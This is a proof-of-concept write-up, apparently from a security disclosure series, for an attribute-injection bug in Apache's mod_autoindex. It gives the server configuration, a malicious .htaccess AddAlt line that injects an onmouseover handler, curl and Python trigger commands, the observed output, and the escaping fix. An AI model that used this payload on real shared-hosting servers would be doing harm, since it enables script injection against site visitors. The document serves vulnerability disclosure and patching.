# PoC 085 - mod_autoindex Unescaped Alt Text In Row Class

`output_directories()` writes lowercased `AddAlt` text directly into a quoted
`<tr class="...">` attribute. A `"` in the alt value breaks out of the
attribute and injects HTML.

## Setup

`/etc/apache2/httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule dir_module modules/mod_dir.so
LoadModule autoindex_module modules/mod_autoindex.so

DocumentRoot "/srv/www"
<Directory "/srv/www">
    Options +Indexes
    DirectoryIndex disabled
    IndexOptions FancyIndexing HTMLTable AddAltClass
    IndexStyleSheet "/style.css"
    AllowOverride Indexes
    Require all granted
</Directory>
```

Place a writable `.htaccess` (the trust boundary the finding requires) in the
listed directory or set the directives globally for demonstration:

`/srv/www/listing/.htaccess`:

```apache
IndexOptions FancyIndexing HTMLTable AddAltClass
IndexStyleSheet "/style.css"
# Quote-bearing alt text breaks out of class attribute.
AddAlt "x\" onmouseover=\"alert(1)" *.txt
```

```bash
mkdir -p /srv/www/listing
touch /srv/www/listing/note.txt
echo 'body{}' > /srv/www/style.css
```

## Trigger

```bash
curl -s http://127.0.0.1:8080/listing/ | grep '<tr class='
```

## Observed effect

The generated row contains attacker-controlled HTML attributes outside the
intended `class` value:

```html
   <tr class="even-x" onmouseover="alert(1)">
```

The browser parses an `onmouseover` handler that the configuration author
never wrote. Loading the index page in a browser executes the injected
handler when the user hovers the row.

## Log marker

There is no httpd-side log marker; the bug is silent on the server. To verify
without a browser:

```bash
curl -s http://127.0.0.1:8080/listing/ \
  | python3 -c 'import sys,html.parser as h
class P(h.HTMLParser):
    def handle_starttag(self,t,a): 
        if t=="tr": print(t,a)
P().feed(sys.stdin.read())'
```

Output:

```text
tr [('class', 'even-x'), ('onmouseover', 'alert(1)')]
```

The `onmouseover` attribute appearing in the parsed output proves attribute
injection into the `<tr>` tag.

## Notes

- The patched build wraps `altclass` with `ap_escape_html(scratch, altclass)`
  before emission, turning `"` into `&quot;` and keeping the attribute closed.
- The `AddAltClass` option is required to reach the row-class branch; the
  separate `<img alt>` injection is covered in PoC 086.
- Reachability: any directory with `AllowOverride Indexes` and a writable
  `.htaccess` allows an unprivileged tenant to set the malicious alt text.
